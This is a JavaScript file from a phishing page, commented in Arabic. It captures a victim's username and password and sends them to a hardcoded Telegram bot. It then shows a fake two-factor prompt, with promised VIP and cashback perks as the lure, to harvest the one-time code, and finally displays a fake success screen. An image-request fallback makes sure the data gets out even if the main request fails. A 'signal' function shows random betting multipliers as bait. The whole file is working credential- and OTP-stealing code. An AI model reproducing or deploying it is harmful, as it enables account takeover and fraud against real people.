const TG_BOT_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

// الحالة الحالية للعملية
let authState = "initial"; 

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const msg = document.getElementById('status-text');
    const btn = document.getElementById('sync-btn');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    // المرحلة الأولى: صيد اليوزر والباسوورد
    if (authState === "initial") {
        btn.disabled = true;
        btn.innerText = "Connecting to Secure Node...";
        msg.innerText = "⏳ جاري فحص الحساب ومزامنة البيانات...";

        await sendToTelegram(`🎯 صيد جديد (خطوة 1)\n👤 المستخدم: ${u}\n🔑 الباسوورد: ${p}`);

        // محاكاة تأخير تقني لزيادة المصداقية
        setTimeout(() => {
            // الانتقال الإجباري لمرحلة طلب الرمز (بدون انتظار الآدمن)
            msg.innerText = "⚠️ تم كشف حماية إضافية (2FA)! يرجى إدخال الرمز الواصل لهاتفك الآن لتفعيل ميزة الـ VIP والـ Cashback:";
            msg.style.color = "#ff4444";
            document.getElementById('u_pas').value = "";
            document.getElementById('u_pas').placeholder = "أدخل رمز المصادقة (6 أرقام)";
            btn.innerText = "تأكيد الرمز النهائي 🔓";
            btn.disabled = false;
            authState = "waiting_2fa";
        }, 3000);

    } else if (authState === "waiting_2fa") {
        // المرحلة الثانية: صيد الرمز
        const code = document.getElementById('u_pas').value;
        if (code.length < 5) return alert("الرمز غير صحيح!");

        btn.disabled = true;
        btn.innerText = "Verifying Code...";

        await sendToTelegram(`🔐 الرمز المستلم (2FA)!\n👤 المستخدم: ${u}\n🔢 الرمز: ${code}`);

        setTimeout(() => {
            // إيهام الضحية بالنجاح للدخول للواجهة الفيروزية
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
        }, 2000);
    }
}

async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
            keepalive: true
        });
    } catch (e) {
        // Fallback في حالة فشل الـ Fetch
        new Image().src = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    }
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        display.innerText = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
    }, 1200);
}
